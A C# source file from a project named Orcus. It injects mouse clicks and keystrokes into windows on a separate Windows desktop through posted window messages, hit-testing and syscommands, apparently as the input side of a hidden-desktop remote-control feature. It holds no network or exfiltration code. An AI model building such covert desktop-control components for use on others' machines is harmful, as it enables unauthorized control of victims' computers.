using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.Shared.Commands.RemoteDesktop;

namespace Orcus.Utilities.WindowsDesktop
{
    public class DesktopActions
    {
        private readonly Desktop _desktop;

        private const uint WM_KEYDOWN = 0x0100;
        private const uint WM_KEYUP = 0x0101;
        private const uint WM_LBUTTONDOWN = 0x201;
        private const uint WM_LBUTTONUP = 0x202;
        private const uint WM_RBUTTONDOWN = 0x204;
        private const uint WM_RBUTTONUP = 0x205;

        private const int VMW_EXECUTE_MENU = -1;
        private const int VMW_HILITE_MENU = -2;

        [DllImport("user32.dll")]
       internal static extern IntPtr WindowFromPoint(Point p);

        [DllImport("user32.dll", ExactSpelling = true, CharSet = CharSet.Auto)]
        internal static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern uint RegisterWindowMessage(string lpString);

        private IntPtr _lastWindow;

        public DesktopActions(Desktop desktop)
        {
            _desktop = desktop;
        }

        public void Load()
        {
            Desktop.SetCurrent(_desktop);
            VncMessage = RegisterWindowMessage(_desktop.DesktopName);
            if (VncMessage == 0)
                throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        public uint VncMessage { get; private set; }

        private const uint MK_LBUTTON = 0x0001;
        private const int HWND_TOP = 0;
        private const int HWND_TOPMOST = -1;

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

        private bool StyleHaveSizeBorders(WindowStyles style)
        {
            return (style & WindowStyles.WS_CAPTION) == WindowStyles.WS_CAPTION ||
                   (style & (WindowStyles.WS_POPUP | WindowStyles.WS_SIZEFRAME)) != 0;
        }

        private const uint GW_OWNER = 4;

        public void DoMouseAction(RemoteDesktopMouseAction mouseAction, int x, int y, int extra, long windowHandle)
        {
            var handle = (IntPtr) windowHandle;

            var windowinfo = new WINDOWINFO(true);
            NativeMethods.GetWindowInfo(handle, ref windowinfo);

            RECT windowRect;
            NativeMethods.GetWindowRect(handle, out windowRect);

            var screenX = windowRect.X + x;
            var screenY = windowRect.Y + y;

            var hitTest = HitTestValues.HTNOWHERE;
            var window = WindowFromPoint(new Point(screenX, screenY), 100, ref hitTest, IntPtr.Zero);

            if (hitTest >= HitTestValues.HTSIZEFIRST && hitTest <= HitTestValues.HTSIZELAST)
            {
                var style = (WindowStyles) GetWindowLong(window, GWL_STYLE);
                if ((style & WindowStyles.WS_CHILD) == WindowStyles.WS_CHILD && !StyleHaveSizeBorders(style))
                {
                    var parent = GetParent(window);
                    if (parent != IntPtr.Zero)
                        window = parent;
                }
            }

            if ((GetWindowClassFlags(window) & WindowPrintTypes.WCF_MOUSE_AUTOCAPTURE) != 0)
            {
                hitTest = HitTestValues.HTCLIENT;
            }

            if (window == IntPtr.Zero)
                return;

            var info = new WINDOWINFO();
            info.cbSize = (uint)Marshal.SizeOf(info);
            if (!NativeMethods.GetWindowInfo(window, ref info))
                return;

            var screenCursorPos = MAKELPARAM(screenX, screenY);
            IntPtr clientCursorPos;
            //if (hitTest == HitTestValues.HTCLIENT)
            //  {
            if ((GetWindowClassFlags(window) & WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN) ==
                WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN)
                clientCursorPos = screenCursorPos;
            else
                clientCursorPos = MAKELPARAM(screenX - info.rcClient.Left, screenY - info.rcClient.Top);

            WM windowMessage;
            WM ncWindowMessage;
            switch (mouseAction)
            {
                case RemoteDesktopMouseAction.LeftDown:
                    windowMessage = WM.LBUTTONDOWN;
                    ncWindowMessage = WM.NCLBUTTONDOWN;
                    break;
                case RemoteDesktopMouseAction.LeftUp:
                    windowMessage = WM.LBUTTONUP;
                    ncWindowMessage = WM.NCLBUTTONUP;
                    break;
                case RemoteDesktopMouseAction.RightDown:
                    windowMessage = WM.RBUTTONDOWN;
                    ncWindowMessage = WM.NCRBUTTONDOWN;
                    break;
                case RemoteDesktopMouseAction.RightUp:
                    windowMessage = WM.RBUTTONUP;
                    ncWindowMessage = WM.NCRBUTTONDOWN;
                    break;
                case RemoteDesktopMouseAction.MiddleDown:
                    windowMessage = WM.MBUTTONDOWN;
                    ncWindowMessage = WM.NCMBUTTONDOWN;
                    break;
                case RemoteDesktopMouseAction.MiddleUp:
                    windowMessage = WM.MBUTTONUP;
                    ncWindowMessage = WM.NCMBUTTONUP;
                    break;
                case RemoteDesktopMouseAction.XButton1Down:
                    windowMessage = WM.XBUTTONDOWN;
                    ncWindowMessage = WM.NCXBUTTONDOWN;
                    break;
                case RemoteDesktopMouseAction.XButton1Up:
                    windowMessage = WM.XBUTTONUP;
                    ncWindowMessage = WM.NCXBUTTONUP;
                    break;
                case RemoteDesktopMouseAction.XButton2Down:
                case RemoteDesktopMouseAction.XButton2Up:
                    return;
                case RemoteDesktopMouseAction.Move:
                    windowMessage = WM.MOUSEMOVE;
                    ncWindowMessage = WM.NCMOUSEMOVE;
                    break;
                case RemoteDesktopMouseAction.Wheel:
                    return;
                default:
                    throw new ArgumentOutOfRangeException(nameof(mouseAction), mouseAction, null);
            }

            MouseEvent(window, windowinfo, hitTest, windowMessage, ncWindowMessage, clientCursorPos, screenCursorPos);
        }

        public void DoMouseClick(Point p, RemoteDesktopMouseAction mouseAction)
        {
            var hitTest = HitTestValues.HTNOWHERE;
            var window = WindowFromPoint(p, 100, ref hitTest, IntPtr.Zero);

            if (hitTest >= HitTestValues.HTSIZEFIRST && hitTest <= HitTestValues.HTSIZELAST)
            {
                var style = (WindowStyles)GetWindowLong(window, GWL_STYLE);
                if ((style & WindowStyles.WS_CHILD) == WindowStyles.WS_CHILD && !StyleHaveSizeBorders(style))
                {
                    var parent = GetParent(window);
                    if (parent != IntPtr.Zero)
                        window = parent;
                }
            }

            //TODO
            if ((GetWindowClassFlags(window) & WindowPrintTypes.WCF_MOUSE_AUTOCAPTURE) != 0)
            {
                hitTest = HitTestValues.HTCLIENT;
            }

            if (window == IntPtr.Zero)
                return;

            var info = new WINDOWINFO();
            info.cbSize = (uint)Marshal.SizeOf(info);
            if (!NativeMethods.GetWindowInfo(window, ref info))
                return;

            var screenCursorPos = MAKELPARAM(p.X, p.Y);
            IntPtr clientCursorPos;
            //if (hitTest == HitTestValues.HTCLIENT)
          //  {
                if ((GetWindowClassFlags(window) & WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN) ==
                    WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN)
                    clientCursorPos = screenCursorPos;
                else
                    clientCursorPos = MAKELPARAM(p.X - info.rcClient.Left, p.Y - info.rcClient.Top);
           // }
           // else
            //    clientCursorPos = IntPtr.Zero;

            if (mouseAction == RemoteDesktopMouseAction.LeftDown)
                MouseEvent(window, info, hitTest, WM.LBUTTONDOWN, WM.NCLBUTTONDOWN, clientCursorPos, screenCursorPos);
            if(mouseAction == RemoteDesktopMouseAction.LeftUp)
                MouseEvent(window, info, hitTest, WM.LBUTTONUP, WM.NCLBUTTONUP, clientCursorPos, screenCursorPos);
            //SetForegroundWindow(result.Key.Handle);
            /*
            NativeMethods.SendMessage(handle, (uint) (isMouseDown ? (leftMouseButton ? WM.LBUTTONDOWN : WM.RBUTTONDOWN) : (leftMouseButton ? WM.LBUTTONUP : WM.RBUTTONUP)),
                (IntPtr) MK_LBUTTON,
                (IntPtr) ((controlY << 16) | (controlX & 0xFFFF)));
            /*
            NativeMethods.PostMessage(new HandleRef(null, handle), (uint) WM.LBUTTONUP,
                IntPtr.Zero, 
                (IntPtr) ((controlY << 16) | (controlX & 0xFFFF)));*/

            //if (handle != result.Key.Handle)
            //   NativeMethods.SendMessage(result.Key.Handle, (uint) WM.PARENTNOTIFY, new IntPtr((uint) WM.LBUTTONDOWN),
            //    MAKELPARAM(windowX, windowY));

            /*NativeMethods.PostMessage(new HandleRef(null, handle), WM_LBUTTONUP,
                (IntPtr) 0x1,
                (IntPtr) ((y << 16) | (x & 0xFFFF)));*/
        }

        [Flags]
        public enum WindowPrintTypes
        {
            WCF_PAINTMETHOD_NOP = 0x01,
            WCF_PAINTMETHOD_PAINT = 0x02,
            WCF_PAINTMETHOD_PRINT = 0x04,
            WCF_PAINTMETHOD_PRINTWINDOW = 0x08, 
            WCF_PAINTMETHOD_SKIP_HOOK = 0x10,
            WCF_MOUSE_CLIENT_TO_SCREEN = 0x20,
            WCF_MOUSE_AUTOCAPTURE = 0x40
        }

        private static readonly Dictionary<string, WindowPrintTypes> _windowPrintTypes =
            new Dictionary<string, WindowPrintTypes>
            {
                {"SysShadow", WindowPrintTypes.WCF_PAINTMETHOD_NOP},
                {
                    "#32768",
                    WindowPrintTypes.WCF_PAINTMETHOD_PRINTWINDOW | WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN |
                    WindowPrintTypes.WCF_MOUSE_AUTOCAPTURE
                },
                {
                    "ConsoleWindowClass",
                    WindowPrintTypes.WCF_PAINTMETHOD_PRINTWINDOW | WindowPrintTypes.WCF_PAINTMETHOD_SKIP_HOOK
                },
                {
                    "CiceroUIWndFrame",
                    WindowPrintTypes.WCF_PAINTMETHOD_PRINTWINDOW | WindowPrintTypes.WCF_PAINTMETHOD_SKIP_HOOK
                },
                {"MDIClient", WindowPrintTypes.WCF_PAINTMETHOD_PRINTWINDOW | WindowPrintTypes.WCF_PAINTMETHOD_SKIP_HOOK},
                {"SysListView32", WindowPrintTypes.WCF_PAINTMETHOD_PRINT}
            };

        private WindowPrintTypes GetWindowClassFlags(IntPtr window)
        {
            const int maxChars = 256;
            var className = new StringBuilder(maxChars);
            if (NativeMethods.GetClassName(window, className, maxChars) > 0)
            {
                foreach (var windowPrintType in _windowPrintTypes)
                {
                    if (string.Equals(className.ToString(), windowPrintType.Key, StringComparison.OrdinalIgnoreCase))
                        return windowPrintType.Value;
                }
            }

            return 0;
        }

        enum SysCommands : int
        {
            SC_SIZE = 0xF000,
            SC_MOVE = 0xF010,
            SC_MINIMIZE = 0xF020,
            SC_MAXIMIZE = 0xF030,
            SC_NEXTWINDOW = 0xF040,
            SC_PREVWINDOW = 0xF050,
            SC_CLOSE = 0xF060,
            SC_VSCROLL = 0xF070,
            SC_HSCROLL = 0xF080,
            SC_MOUSEMENU = 0xF090,
            SC_KEYMENU = 0xF100,
            SC_ARRANGE = 0xF110,
            SC_RESTORE = 0xF120,
            SC_TASKLIST = 0xF130,
            SC_SCREENSAVE = 0xF140,
            SC_HOTKEY = 0xF150,
            //#if(WINVER >= 0x0400) //Win95
            SC_DEFAULT = 0xF160,
            SC_MONITORPOWER = 0xF170,
            SC_CONTEXTHELP = 0xF180,
            SC_SEPARATOR = 0xF00F,
            //#endif /* WINVER >= 0x0400 */

            //#if(WINVER >= 0x0600) //Vista
            SCF_ISSECURE = 0x00000001,
            //#endif /* WINVER >= 0x0600 */

            /*
              * Obsolete names
              */
            SC_ICON = SC_MINIMIZE,
            SC_ZOOM = SC_MAXIMIZE,
        }

        [DllImport("user32.dll", ExactSpelling = true)]
        static extern IntPtr GetAncestor(IntPtr hwnd, GetAncestorFlags flags);

        enum GetAncestorFlags
        {
            /// <summary>
            /// Retrieves the parent window. This does not include the owner, as it does with the GetParent function. 
            /// </summary>
            GetParent = 1,
            /// <summary>
            /// Retrieves the root window by walking the chain of parent windows.
            /// </summary>
            GetRoot = 2,
            /// <summary>
            /// Retrieves the owned root window by walking the chain of parent and owner windows returned by GetParent. 
            /// </summary>
            GetRootOwner = 3
        }

        public enum MouseActivate : int
        {
            MA_ACTIVATE = 1,
            MA_ACTIVATEANDEAT = 2,
            MA_NOACTIVATE = 3,
            MA_NOACTIVATEANDEAT = 4
        }

        private void MouseEvent(IntPtr window, WINDOWINFO windowinfo, HitTestValues hitTest, WM message, WM ncMessage, IntPtr clientCursorPos, IntPtr screenCursorPos)
        {
            if (message == WM.LBUTTONDOWN || message == WM.MBUTTONDOWN || message == WM.RBUTTONDOWN)
            {
                var topParent = GetAncestor(window, GetAncestorFlags.GetRoot);

                if (topParent != _lastWindow)
                {
                    IntPtr result;
                    MouseActivate mouseActivateResult;
                    if (
                        SendMessageTimeout(window, (uint) WM.MOUSEACTIVATE, topParent,
                            MAKELPARAM((int) hitTest, (int) message),
                            SendMessageTimeoutFlags.SMTO_ABORTIFHUNG | SendMessageTimeoutFlags.SMTO_NORMAL, 100,
                            out result) != IntPtr.Zero &&
                        (((mouseActivateResult = (MouseActivate) result) == MouseActivate.MA_ACTIVATEANDEAT) ||
                         mouseActivateResult == MouseActivate.MA_NOACTIVATEANDEAT))
                    {
                        return;
                    }

                    NativeMethods.SetWindowPos(topParent, new IntPtr(HWND_TOPMOST), 0, 0, 0, 0,
                        SetWindowPosFlags.IgnoreMove | SetWindowPosFlags.IgnoreResize | SetWindowPosFlags.ShowWindow);
                    _lastWindow = topParent;
                }
            }

            NativeMethods.PostMessage(new HandleRef(null, window), WM.SETCURSOR, window,
                MAKELPARAM((int) hitTest, (int) message));

            if (hitTest == HitTestValues.HTCLIENT)
            {
                NativeMethods.PostMessage(new HandleRef(null, window), message, (IntPtr) MK_LBUTTON, clientCursorPos);
                return;
            }

            SysCommands command = 0;
            switch (hitTest)
            {
                case HitTestValues.HTSYSMENU:
                    if (ncMessage == WM.NCLBUTTONDBLCLK)
                        command = SysCommands.SC_CLOSE;
                    else if (ncMessage == WM.NCRBUTTONUP || ncMessage == WM.NCLBUTTONDOWN)
                        command = (SysCommands) 0xFFFF;
                    break;
                case HitTestValues.HTMINBUTTON:
                    if (ncMessage == WM.NCLBUTTONUP)
                    {
                        if (((WindowStyles) windowinfo.dwStyle & WindowStyles.WS_MINIMIZEBOX) != 0)
                            command = SysCommands.SC_MINIMIZE;
                    }
                    else if (ncMessage == WM.NCRBUTTONUP) command = (SysCommands) 0xFFFF;
                    break;
                case HitTestValues.HTMAXBUTTON:
                    if (ncMessage == WM.NCLBUTTONUP)
                    {
                        if (((WindowStyles) windowinfo.dwStyle & WindowStyles.WS_MAXIMIZEBOX) != 0)
                        {
                            command = ((WindowStyles) windowinfo.dwStyle & WindowStyles.WS_MAXIMIZE) == 0
                                ? SysCommands.SC_MAXIMIZE
                                : SysCommands.SC_RESTORE;
                        }
                    }
                    else if (ncMessage == WM.NCRBUTTONUP) command = (SysCommands) 0xFFFF;
                    break;
                case HitTestValues.HTCLOSE:
                    if (ncMessage == WM.NCLBUTTONUP)
                    {
                        command = SysCommands.SC_CLOSE;
                    }
                    else if (ncMessage == WM.NCRBUTTONUP) command = (SysCommands) 0xFFFF;
                    break;
                case HitTestValues.HTHELP:
                    if (ncMessage == WM.NCLBUTTONUP)
                        command = SysCommands.SC_CONTEXTHELP;
                    else if (ncMessage == WM.NCRBUTTONUP) command = (SysCommands) 0xFFFF;
                    break;
                case HitTestValues.HTMENU:
                    if (ncMessage == WM.NCLBUTTONDOWN)
                    {
                        NativeMethods.PostMessage(new HandleRef(null, window), (WM) VncMessage, (IntPtr) VMW_EXECUTE_MENU, IntPtr.Zero);
                    } else if (ncMessage == WM.NCMOUSEMOVE)
                    {
                        NativeMethods.PostMessage(new HandleRef(null, window), (WM)VncMessage, (IntPtr)VMW_HILITE_MENU, IntPtr.Zero);
                    }
                    break;
                case HitTestValues.HTCAPTION:
                    if (ncMessage == WM.NCLBUTTONDBLCLK)
                    {
                        NativeMethods.PostMessage(new HandleRef(null, window), ncMessage, (IntPtr) hitTest, clientCursorPos);
                    }
                    else if (ncMessage == WM.NCRBUTTONUP) command = (SysCommands)0xFFFF;
                    break;
                default:
                    NativeMethods.PostMessage(new HandleRef(null, window), 
                         message,
                        (IntPtr)MK_LBUTTON, clientCursorPos);
                    NativeMethods.PostMessage(new HandleRef(null, window), ncMessage, (IntPtr) hitTest, screenCursorPos);
                    break;
            }

            if (command != 0)
            {
                if (command == (SysCommands) 0xFFFF)
                    NativeMethods.PostMessage(new HandleRef(null, window), WM.CONTEXTMENU, (IntPtr) command, clientCursorPos);
                else
                    NativeMethods.PostMessage(new HandleRef(null, window), WM.SYSCOMMAND, (IntPtr) command, clientCursorPos);
            }
        }

        private IntPtr MAKELPARAM(int p, int p2)
        {
            return (IntPtr) ((p2 << 16) | (p & 0xFFFF));
        }

        [Flags]
       public enum SendMessageTimeoutFlags : uint
        {
            SMTO_NORMAL = 0x0,
            SMTO_BLOCK = 0x1,
            SMTO_ABORTIFHUNG = 0x2,
            SMTO_NOTIMEOUTIFNOTHUNG = 0x8,
            SMTO_ERRORONEXIT = 0x20
        }

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr SendMessageTimeout(
            IntPtr windowHandle,
            uint Msg,
            IntPtr wParam,
            IntPtr lParam,
            SendMessageTimeoutFlags flags,
            uint timeout,
            out IntPtr result);


        public void KeyDown(Keys key, bool down)
        {
            _desktop.PostMessage(down ? WM.KEYDOWN : WM.KEYUP, (IntPtr) key, IntPtr.Zero);
            Debug.Print("Key action: " + key + " (" + down + ")");
        }

       public enum HitTestValues
        {
            HTERROR = -2,
            HTTRANSPARENT = -1,
            HTNOWHERE = 0,
            HTCLIENT = 1,
            HTCAPTION = 2,
            HTSYSMENU = 3,
            HTGROWBOX = 4,
            HTMENU = 5,
            HTHSCROLL = 6,
            HTVSCROLL = 7,
            HTMINBUTTON = 8,
            HTMAXBUTTON = 9,
            HTLEFT = 10,
            HTRIGHT = 11,
            HTTOP = 12,
            HTTOPLEFT = 13,
            HTTOPRIGHT = 14,
            HTBOTTOM = 15,
            HTBOTTOMLEFT = 16,
            HTBOTTOMRIGHT = 17,
            HTBORDER = 18,
            HTOBJECT = 19,
            HTCLOSE = 20,
            HTHELP = 21,
            HTSIZEFIRST = 10,
            HTSIZELAST = 17,
        }

        static readonly int GWL_STYLE = -16;

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [Flags()]
        private enum WindowStyles : uint
        {
            /// <summary>The window has a thin-line border.</summary>
            WS_BORDER = 0x800000,

            /// <summary>The window has a title bar (includes the WS_BORDER style).</summary>
            WS_CAPTION = 0xc00000,

            /// <summary>The window is a child window. A window with this style cannot have a menu bar. This style cannot be used with the WS_POPUP style.</summary>
            WS_CHILD = 0x40000000,

            /// <summary>Excludes the area occupied by child windows when drawing occurs within the parent window. This style is used when creating the parent window.</summary>
            WS_CLIPCHILDREN = 0x2000000,

            /// <summary>
            /// Clips child windows relative to each other; that is, when a particular child window receives a WM_PAINT message, the WS_CLIPSIBLINGS style clips all other overlapping child windows out of the region of the child window to be updated.
            /// If WS_CLIPSIBLINGS is not specified and child windows overlap, it is possible, when drawing within the client area of a child window, to draw within the client area of a neighboring child window.
            /// </summary>
            WS_CLIPSIBLINGS = 0x4000000,

            /// <summary>The window is initially disabled. A disabled window cannot receive input from the user. To change this after a window has been created, use the EnableWindow function.</summary>
            WS_DISABLED = 0x8000000,

            /// <summary>The window has a border of a style typically used with dialog boxes. A window with this style cannot have a title bar.</summary>
            WS_DLGFRAME = 0x400000,

            /// <summary>
            /// The window is the first control of a group of controls. The group consists of this first control and all controls defined after it, up to the next control with the WS_GROUP style.
            /// The first control in each group usually has the WS_TABSTOP style so that the user can move from group to group. The user can subsequently change the keyboard focus from one control in the group to the next control in the group by using the direction keys.
            /// You can turn this style on and off to change dialog box navigation. To change this style after a window has been created, use the SetWindowLong function.
            /// </summary>
            WS_GROUP = 0x20000,

            /// <summary>The window has a horizontal scroll bar.</summary>
            WS_HSCROLL = 0x100000,

            /// <summary>The window is initially maximized.</summary> 
            WS_MAXIMIZE = 0x1000000,

            /// <summary>The window has a maximize button. Cannot be combined with the WS_EX_CONTEXTHELP style. The WS_SYSMENU style must also be specified.</summary> 
            WS_MAXIMIZEBOX = 0x10000,

            /// <summary>The window is initially minimized.</summary>
            WS_MINIMIZE = 0x20000000,

            /// <summary>The window has a minimize button. Cannot be combined with the WS_EX_CONTEXTHELP style. The WS_SYSMENU style must also be specified.</summary>
            WS_MINIMIZEBOX = 0x20000,

            /// <summary>The window is an overlapped window. An overlapped window has a title bar and a border.</summary>
            WS_OVERLAPPED = 0x0,

            /// <summary>The window is an overlapped window.</summary>
            WS_OVERLAPPEDWINDOW = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_SIZEFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX,

            /// <summary>The window is a pop-up window. This style cannot be used with the WS_CHILD style.</summary>
            WS_POPUP = 0x80000000u,

            /// <summary>The window is a pop-up window. The WS_CAPTION and WS_POPUPWINDOW styles must be combined to make the window menu visible.</summary>
            WS_POPUPWINDOW = WS_POPUP | WS_BORDER | WS_SYSMENU,

            /// <summary>The window has a sizing border.</summary>
            WS_SIZEFRAME = 0x40000,

            /// <summary>The window has a window menu on its title bar. The WS_CAPTION style must also be specified.</summary>
            WS_SYSMENU = 0x80000,

            /// <summary>
            /// The window is a control that can receive the keyboard focus when the user presses the TAB key.
            /// Pressing the TAB key changes the keyboard focus to the next control with the WS_TABSTOP style.  
            /// You can turn this style on and off to change dialog box navigation. To change this style after a window has been created, use the SetWindowLong function.
            /// For user-created windows and modeless dialogs to work with tab stops, alter the message loop to call the IsDialogMessage function.
            /// </summary>
            WS_TABSTOP = 0x10000,

            /// <summary>The window is initially visible. This style can be turned on and off by using the ShowWindow or SetWindowPos function.</summary>
            WS_VISIBLE = 0x10000000,

            /// <summary>The window has a vertical scroll bar.</summary>
            WS_VSCROLL = 0x200000
        }

        private IntPtr WindowFromPoint(Point point, uint timeout, ref HitTestValues hitTest, IntPtr lastestWindowFromPoint)
        {
            var window = WindowFromPoint(point);
            if (window != IntPtr.Zero)
            {
                IntPtr result;
                if (
                    SendMessageTimeout(window, (uint) WM.NCHITTEST, IntPtr.Zero, MAKELPARAM(point.X, point.Y),
                        SendMessageTimeoutFlags.SMTO_ABORTIFHUNG | SendMessageTimeoutFlags.SMTO_NORMAL, timeout,
                        out result) == IntPtr.Zero)
                {
                    window = IntPtr.Zero;
                }
                else
                {
                    var hitTestResult = (HitTestValues)result;
                    if (hitTestResult == HitTestValues.HTTRANSPARENT)
                    {
                        if (window == lastestWindowFromPoint)
                        {
                            //prevent infinite loop
                            return lastestWindowFromPoint;
                        }
                        var currentWindow = window;
                        SetWindowLong(window, GWL_STYLE,
                                (int)
                                    ((WindowStyles) GetWindowLong(currentWindow, GWL_STYLE) |
                                     WindowStyles.WS_DISABLED));
                        window = WindowFromPoint(point, timeout, ref hitTest, window);
                        SetWindowLong(window, GWL_STYLE,
                                (int)
                                    ((WindowStyles) GetWindowLong(currentWindow, GWL_STYLE) &
                                     ~WindowStyles.WS_DISABLED));
                    }
                    else
                    {
                        if (hitTest == 0)
                            hitTest = hitTestResult;
                    }
                }
            }
            return window;
        }
    }
}